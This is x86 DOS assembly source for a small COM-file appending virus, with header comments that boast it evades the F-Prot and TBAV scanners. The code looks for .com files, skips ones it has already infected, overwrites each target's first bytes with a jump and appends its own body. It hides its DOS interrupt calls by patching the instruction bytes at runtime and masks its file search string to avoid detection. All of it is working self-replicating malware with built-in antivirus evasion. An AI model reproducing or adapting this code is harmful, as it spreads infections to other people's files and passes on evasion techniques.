;
;               Simple com appender destined to be another SillyC
;               so im putting the file name in as the virus name .. nuff said
;
;               Unscannable by F-Prot & by TBAV with no flags
;               Uses a novel way of beating S flag
;
;               Scans as a VCL/IVP variant with AVP/DSAV
;
.model    tiny
.code
     org  100h
begin:
     db   0E9h
     dw   offset start-103h
start:
     call delta
delta:
     pop  bp
     sub  bp,offset delta
     and  word ptr [begin],0
     and  byte ptr [begin+2],0
     or   ah,[old_bytes+bp]
     or   al,[old_bytes+bp+1]
     or   bh,[old_bytes+bp+2]
     or   byte ptr [begin],ah
     or   byte ptr [begin+1],al
     or   byte ptr [begin+2],bh 
     and  byte ptr [f_string+bp],7Fh
     and  byte ptr [f_string+bp+1],7Fh
     and  byte ptr [f_string+bp+2],7Fh
     and  byte ptr [f_string+bp+3],7Fh
     and  byte ptr [f_string+bp+4],7Fh
     mov  dh,1ah
     lea  ax,[bp+offset dta]
     xchg ax,dx
     int  21h
     mov  dh,4eh
find_next:
     xor  cx,cx
     lea  ax,[bp+offset f_string]
     xchg ax,dx
     int  21h
     jc   done2
     mov  cl,[dta+1ah+bp]
     mov  ch,[dta+1bh+bp]
     sub  cx,3
     mov  [new_bytes+1+bp],cl
     mov  [new_bytes+2+bp],ch
     mov  dx,3D02h
     lea  ax,[bp+offset dta+1Eh]
     xchg ax,dx
     int  21h
     xchg ax,bx
     mov  dh,3fh
     mov  cx,3
     lea  ax,[bp+offset old_bytes]
     xchg ax,dx
     int  21h
     cmp  [bp+old_bytes],0E9h
     jne  okay
     mov  ah,3eh
     int  21h
     mov  dh,4fh
     jmp  find_next
done2:
     jmp  done
okay:
     mov  dx,4200h
     xor  cx,cx
     xor  ax,ax
     xchg ax,dx
     int  21h
     mov  dh,40h
     mov  cx,3
     lea  ax,[bp+offset new_bytes]
     xchg ax,dx
     and  byte ptr [n1+bp+1],7fh
n1:
     int  0A1h
     mov  byte ptr [n1+bp+1],0A1h
     mov  dx,4202h
     xor  cx,cx
     xor  ax,ax
     xchg ax,dx
     int  21h
     mov  dh,40h
     mov  cx, offset theend - offset start + 56
     or   byte ptr [f_string+bp],80h
     or   byte ptr [f_string+bp+1],80h
     or   byte ptr [f_string+bp+2],80h
     or   byte ptr [f_string+bp+3],80h
     or   byte ptr [f_string+bp+4],80h
     lea  ax,[bp+offset start]
     xchg ax,dx
     and  byte ptr [n2+bp+1],7fh
n2:
     int  0A1h
     mov  ah,3Eh
     int  21h
done:
     mov  ax,101h
     xor  bx,bx
     xchg ax,bx
     xor  cx,cx
     dec  bx
     xor  dx,dx
     push bx
     xor  bp,bp
     xor  bx,bx
     ret
;danke db 'Nightwak'
theend:
.data
old_bytes db   0c3h,90h,90h
new_bytes db   0E9h, 2 dup (0)
dta       db   42 dup(0)
f_string  db   '*'+80h,'.'+80h,'c'+80h,'o'+80h,'m'+80h,0,0
     end  begin
